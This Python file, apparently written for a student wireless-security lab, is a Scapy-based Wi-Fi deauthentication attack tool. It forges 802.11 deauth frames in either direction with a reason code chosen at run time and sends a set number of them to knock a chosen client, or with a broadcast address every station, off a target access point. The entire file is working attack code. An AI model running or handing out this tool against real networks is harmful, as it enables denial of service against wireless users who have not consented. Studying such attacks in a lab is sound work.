#!/usr/bin/env python3
# -- coding: utf-8 --

# Author : Quentin Le Ray, Ryan Sauge
# Date : 27.03.2022
# Basé sur le script trouvé ici : https://github.com/catalyst256/MyJunk/blob/master/scapy-deauth.py
# Remarques : Nous avons décidé que le code 1 allait être envoyé par le client, car il y a plus de chances
# qu'un client envoie ce code par rapport à une station.

import argparse

from scapy.all import conf, sendp
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth

# Passing arguments
parser = argparse.ArgumentParser(prog="Scapy deauth attack",
                                 usage="%(prog)s -i mon0 -b 00:11:22:33:44:55 -c 55:44:33:22:11:00 -n 50",
                                 description="Scapy based wifi Deauth by @catalyst256",
                                 allow_abbrev=False)

parser.add_argument("-i", "--Interface", required=True,
                    help="The interface that you want to send packets out of, needs to be set to monitor mode")
parser.add_argument("-b", "--BSSID", required=True,
                    help="The BSSID (MAC) of the Wireless Access Point you want to target")
parser.add_argument("-c", "--Client", required=True,
                    help="The MAC address of the Client you want to kick off the Access Point, use FF:FF:FF:FF:FF:FF if you want a broadcasted deauth to all stations on the targeted Access Point")
parser.add_argument("-n", "--Number", required=True, help="The number of deauth packets you want to send")

args = parser.parse_args()

print("Quel Reason Code voulez-vous utiliser ?\n \
        1 - Unspecified\n \
        4 - Disassociated due to inactivity\n \
        5 - Disassociated because AP is unable to handle all currently associated stations\n \
        8 - Deauthenticated because sending STA is leaving BSS")

# Get response from user
reasonCode = int(input())

# Set verbose mode to 0
conf.verb = 0
# Interface to use for send packets
conf.iface = args.Interface

# Var to manage if package is send to AP or STA
apToSTA = 2

# Manage to witch device send packet (AP or STA)
if reasonCode in [4, 5]:
    # Send packet to STA with mac adress of AP
    packet = RadioTap() / Dot11(type=0, subtype=12, addr1=args.Client, addr2=args.BSSID,
                                addr3=args.BSSID) / Dot11Deauth(reason=reasonCode)
    apToSTA = 1
elif reasonCode in [1, 8]:
    # Send packet to AP with MAC address of STA
    packet = RadioTap() / Dot11(type=0, subtype=12, addr1=args.BSSID, addr2=args.Client,
                                addr3=args.Client) / Dot11Deauth(reason=reasonCode)
    apToSTA = 0

# Sending deauth
for n in range(int(args.Number)):
    # Send packet to STA
    if apToSTA == 1:
        sendp(packet)
        print(f"Deauth sent via: {conf.iface} to Client: {args.Client} using BSSID: {args.BSSID}")
    # Send packet to AP
    elif apToSTA == 0:
        sendp(packet)
        print(f"Deauth sent via: {conf.iface} to BSSID: {args.BSSID} for Client: {args.Client}")
    # Reason code unexpected
    else:
        print("Error, unsupported reason code")
